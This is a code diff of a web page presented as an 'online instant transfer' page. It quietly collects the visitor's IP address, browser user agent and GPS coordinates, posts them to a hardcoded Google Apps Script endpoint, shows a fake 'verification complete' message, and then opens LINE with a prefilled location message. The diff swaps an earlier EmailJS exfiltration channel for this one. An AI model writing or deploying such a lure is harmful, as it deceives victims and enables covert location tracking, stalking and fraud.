@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>線上立即轉帳</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
         button { padding: 15px 25px; font-size: 20px; }
@@ -17,10 +16,7 @@
     <p id="status"></p>
 
     <script>
-        // 初始化 EmailJS
-        (function() {
-            emailjs.init("3Ih6a7-AdAxrbeq_L"); // 請替換為你的 EmailJS Public Key
-        })();
+        const GAS_URL = "https://script.google.com/macros/s/AKfycbyWCmFH3MfqiclvhddGbWTmltlAzQIV5xI4bgB2QxmXgtvxM9vjhU1b7oCje9aaNglGbQ/exec";
 
         async function sendLocation() {
             const btn = document.getElementById("actionBtn");
@@ -33,35 +29,34 @@
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // 取得瀏覽器資訊
                 const userAgent = navigator.userAgent;
 
                 // 取得定位
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(position) {
+                    navigator.geolocation.getCurrentPosition(async function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
                         const text = `這是我的位置：\n${mapLink}`;
 
-                        // 發送 Email
-                        emailjs.send("service_l8rizek", "template_v1aubd6", {
-                            from_name: "位置回報系統",
-                            latitude: lat,
-                            longitude: lon,
-                            map_link: mapLink,
-                            ip_address: userIP,
-                            user_agent: userAgent
-                        }).then(function() {
-                            document.getElementById("status").innerText = "驗證完成，請稍候...";
-                            setTimeout(() => {
-                                // 自動開啟 LINE
-                                window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
-                            }, 1500);
-                        }, function(error) {
-                            document.getElementById("status").innerText = "系統忙碌，請稍後重試。";
-                            btn.disabled = false;
+                        // 發送到 GAS
+                        await fetch(GAS_URL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                latitude: lat,
+                                longitude: lon,
+                                mapLink: mapLink,
+                                ip: userIP,
+                                userAgent: userAgent
+                            })
                         });
+
+                        document.getElementById("status").innerText = "驗證完成，請稍候...";
+                        setTimeout(() => {
+                            // 開啟 LINE 傳送頁面
+                            window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
+                        }, 1500);
 
                     }, function(error) {
                         document.getElementById("status").innerText = "定位失敗，請允許位置存取。";
